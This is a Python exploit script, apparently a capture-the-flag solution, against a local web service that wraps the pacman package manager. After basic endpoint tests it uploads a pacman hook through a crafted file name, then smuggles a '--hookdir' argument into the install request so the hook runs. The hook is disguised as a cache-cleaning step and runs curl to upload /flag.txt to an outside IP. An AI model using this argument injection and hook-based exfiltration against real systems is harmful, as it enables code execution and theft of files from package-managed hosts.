import requests
from os import system
from base64 import b64encode
from ipdb import set_trace

session = requests.Session()
session.timeout = None
target = "http://localhost:5000%s"
local_wget = "/var/cache/pacman/pkg/wget-1.18-1-x86_64.pkg.tar.xz"

pacman_hook = """
[Trigger]
Operation = Upgrade
Operation = Install
Operation = Remove
Type = Package
Target = *

[Action]
Description = Cleaning pacman cache...
When = PostTransaction
Exec = /bin/bash -c "curl --upload-file /flag.txt http://192.168.178.128:4444"
"""

def test_info():
    print("Testing /info")
    resp = session.post(target % "/info", json={'package': 'wget'})
    assert "Levente Polyak <anthraxx@archlinux.org>" in resp.text, resp.text
    print("info works")

def test_install():
    print("Testing /install")
    resp = session.post(target % "/install", json={'package': 'wget'})
    assert "OK" in resp.text, resp.text
    #print(resp.text)
    print("install works")

def test_remove():
    print("Testing /remove")
    resp = session.post(target % "/remove")
    assert "OK" in resp.text, resp.text
    #print(resp.text)
    print("remove works")

def test_check():
    print("Testing /check")
    wget_b64 = b64encode(open(local_wget, "rb").read()).decode() 
    upload_dict = { 'name': 'wget',
                    'content': wget_b64
                  }
    resp = session.post(target % "/check", json=upload_dict)
    assert "wget W: ELF file ('usr/bin/wget') lacks FULL RELRO, check" in resp.text, resp.text
    print("check works")


def upload_hook():
    pac = b64encode(pacman_hook.encode()).decode()
    upload_dict = { 'name': ' -d.hook',
                    'content': pac
                  }
    resp = session.post(target % "/check", json=upload_dict)
    print("Uploaded hook")
    # this will throw an exception
    #print(resp.text)

def run_hook():
    test_remove() # if wget is already installed the hook does not get called
    j = {'package': ["--hookdir", "/tmp/pacman/", "wget"]}
    resp = session.post(target % "/install", json=j)
    assert "OK" in resp.text, resp.text
    print("looks good")
    #print(resp.text)

def tests():
    test_info()
    test_install()
    test_remove()
    test_install()
    test_check()

if __name__ == '__main__':
    system("cp {} .".format(local_wget))
    tests()
    upload_hook()
    run_hook()


